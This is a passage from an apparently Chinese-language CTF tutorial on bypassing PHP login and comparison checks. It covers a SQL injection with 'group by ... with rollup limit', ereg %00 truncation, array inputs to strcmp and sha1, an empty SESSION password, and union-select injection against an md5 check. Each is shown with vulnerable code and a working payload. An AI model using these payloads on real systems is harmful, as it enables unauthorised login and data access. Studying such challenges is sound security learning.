class=\"token operator\">|</span> <span class=\"token class-name\">dumbo</span>      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">superman</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">genious</span>    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Angelina</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">I</span><span class=\"token operator\">-</span>kill<span class=\"token operator\">-</span><span class=\"token class-name\">you</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">7</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">batman</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">mob</span><span class=\"token operator\">!</span><span class=\"token class-name\">le</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Dummy</span>    <span class=\"token operator\">|</span> <span class=\"token class-name\">p</span>@<span class=\"token class-name\">ssword</span>   <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">stupid</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">stupidity</span>  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">stupid</span>   <span class=\"token operator\">|</span> <span class=\"token keyword type-declaration\">NULL</span>       <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token number\">13</span> rows in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时你就会发现密码变空了，如果此时登录的话，密码不填，用户名写成<code>‘group by password with rollup --+</code>不就可以绕过了吗（用单引号闭合是因为语句<code>uname = &#39;&#123;$_POST[&#39;uname&#39;]&#125;&#39;</code>），结果是不行，因为这里有语句<code>if (mysql_num_rows($query) == 1)</code>，它只允许有一行返回结果时才往下运行，不过这个也好办，我们用limit就可以了，本地测试如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mysql<span class=\"token operator\">></span> select <span class=\"token operator\">*</span> from users group by password with rollup limit <span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">id</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">username</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">password</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">stupid</span>   <span class=\"token operator\">|</span> <span class=\"token keyword type-declaration\">NULL</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>所以payload就可以构造出来了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">unname<span class=\"token operator\">=</span>'group by password with rollup limit <span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\npasswd<span class=\"token operator\">=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"ereg正则-00截断\"><a href=\"#ereg正则-00截断\" class=\"headerlink\" title=\"ereg正则%00截断\"></a>ereg正则%00截断</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ereg</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"^[a-zA-Z0-9]+$\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;p>You password must be alphanumeric&lt;/p>'</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">9999999</span><span class=\"token punctuation\">)</span>\n   <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'*-*'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//strpos — 查找字符串首次出现的位置</span>\n      <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Flag: '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token keyword\">else</span>\n      <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;p>*-* have not been found&lt;/p>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n       <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">else</span> \n     <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;p>Invalid password&lt;/p>'</span><span class=\"token punctuation\">;</span> \n      <span class=\"token punctuation\">&#125;</span>\n   <span class=\"token punctuation\">&#125;</span> \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话有三个条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、 <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ereg</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"^[a-zA-Z0-9]+$\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">2</span>、<span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">9999999</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">3</span>、  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'*-*'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>先看第一个，^表示匹配开头，那么这里的话是<code>^[a-zA-Z0-9]</code>，含义也就是以字母和数字开头，而后有个+，+表示前面的子表达式可匹配多次，在这里也就是说可以有多个字母和数字，结尾是$，在这里的含义就是需要以数字或者字母作为结尾，这里的话正常写就行，看下一个条件</p>\n<p>第二个条件是<code>strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999</code>，密码最多只能写七位，但还需要大于七个9，这个时候怎么办呢，这个时候就要提到PHP中的科学技术法的表示方法了，它的表示方法是1e2这种，这表示1*10的二次方，也就是100,测试如下<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141529138.png\" alt=\"在这里插入图片描述\"><br>大家也可自行测试，那么知道了这一点，这里做的话就简单了，我们写个1e8这种就可以绕过了。现在看最后一个条件</p>\n<p>最后一个条件是<code>if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)</code>，这个其实也就是让password中包含<code>*-*</code>，如果直接写的话，不符合正则表达式的要求，但我们知道当语句遇到%00的时候就会认为是休止符，不再往后看，我们如果在password中添加%00，再添加这个字符串，是不是就可以成功绕过呢，我们构造payload如下进行尝试</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token operator\">=</span><span class=\"token number\">1e8</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">*</span><span class=\"token operator\">-</span><span class=\"token operator\">*</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141529980.png\" alt=\"在这里插入图片描述\"><br>成功绕过</p>\n<h2 id=\"strcmp比较字符串\"><a href=\"#strcmp比较字符串\" class=\"headerlink\" title=\"strcmp比较字符串\"></a>strcmp比较字符串</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  \n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。 </span>\n\n    <span class=\"token comment\">//比较两个字符串（区分大小写） </span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Flag: '</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">else</span>  \n        <span class=\"token keyword\">print</span> <span class=\"token string single-quoted-string\">'No'</span><span class=\"token punctuation\">;</span>  \n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>先了解一下strcmp函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword type-declaration\">int</span> <span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$str1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span>\n注意该比较区分大小写。 \n如果 str1 小于 str2 返回 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span>；如果 str1 大于 str2 返回 <span class=\"token operator\">></span> <span class=\"token number\">0</span>；如果两者相等，返回 <span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>此时就知道了要求相比较的是两个字符串，这里的话如果传入数组的话，会报错，其实也就类似于intval函数，这个函数在 php5.3之前，显示了报错的信息后，将会把这个函数的运算结果输出为Null，此时我们再看这个语句<code> if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code>，它是一个弱比较类型，当输出为Null时，也就是<code>if(Null==0)</code>，弱比较类型不看类型，只看值是否相同，那么此时就相当于说<code>Null ==0</code>是成立的，因此我们这里传值为数组就可以成功绕过了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528829.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"sha-函数比较绕过\"><a href=\"#sha-函数比较绕过\" class=\"headerlink\" title=\"sha()函数比较绕过\"></a>sha()函数比较绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;p>Your password can not be your name!&lt;/p>'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n      <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Flag: '</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;p>Invalid password.&lt;/p>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;p>Login first!&lt;/p>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>它这里的话是传入两个变量，<code>name</code>和<code>password</code>，两者经过sha1算法后进行强比较，也就是既比较类型，也比较值，但sha1算法加密的同样是字符串，那就意味着当值为数组时同样会报错，如果我们让两个都报错，那么他们肯定是同种类型的Null，此时就可以绕过，正常的话我们会构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">name<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>password<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但是这里还有一个语句就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;p>Your password can not be your name!&lt;/p>'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>也就是要求两者不能一样，不过这个的绕过也简单，我们只需要将两个1随便变一个就可以了，反正结果不受后面数字影响，都是Null，因此构造最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">name<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>password<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141529137.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"SESSION验证绕过\"><a href=\"#SESSION验证绕过\" class=\"headerlink\" title=\"SESSION验证绕过\"></a>SESSION验证绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">die</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Flag: '</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string single-quoted-string\">'&lt;p>Wrong guess.&lt;/p>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">mt_srand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">microtime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>条件是<code>$_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]</code>，这里session中的password是不存在的，需要我们自己传值，那我们如果不传的话不就为Null了吗，此时我们的GET传password也传个空，此时两者是不是就相等了呢，我们尝试一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141529076.png\" alt=\"在这里插入图片描述\"><br>成功绕过</p>\n<h2 id=\"union-select注入绕过md5密码\"><a href=\"#union-select注入绕过md5密码\" class=\"headerlink\" title=\"union select注入绕过md5密码\"></a>union select注入绕过md5密码</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token prolog\">&lt;?php\nshow_source(__FILE__);\n//配置数据库\nif($_POST[user] &amp;&amp; $_POST[pass]) &#123;\n    $conn = mysql_connect(\"********, \"*****\", \"********\");\n    mysql_select_db(\"phpformysql\") or die(\"Could not select database\");\n    if ($conn->connect_error) &#123;\n        die(\"Connection failed: \" . mysql_error($conn));\n&#125; \n\n\n$user = $_POST[user];\n$pass = md5($_POST[pass]);\n\n$sql = \"select pw from php where user='$user'\";\n$query = mysql_query($sql);\nif (!$query) &#123;\n    printf(\"Error: %s\\n\", mysql_error($conn));\n    exit();\n&#125;\n$row = mysql_fetch_array($query, MYSQL_ASSOC);\n\n  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;\n\n    echo \"&lt;p>Logged in! Key:************** &lt;/p>\";\n&#125;\nelse &#123;\n    echo(\"&lt;p>Log in failure!&lt;/p>\");\n\n  &#125;\n&#125;\n?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>条件是<code>  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw])))</code>，而这个<code>$row[pw]</code>是从根据SQL语句从数据库中查询出来的，因此前面这个也就是说要在数据库中存在这个SQL语句对应的密码，而后面的就是校验了，看你输入的密码与数据库是否匹配，这个时候就想到了union select可以自己创一行数据（当然是小白的看法，可能有误，还请师傅们见谅），本地测试如下图</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mysql<span class=\"token operator\">></span> select <span class=\"token operator\">*</span> from users where username<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span> union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">id</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">username</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">password</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span 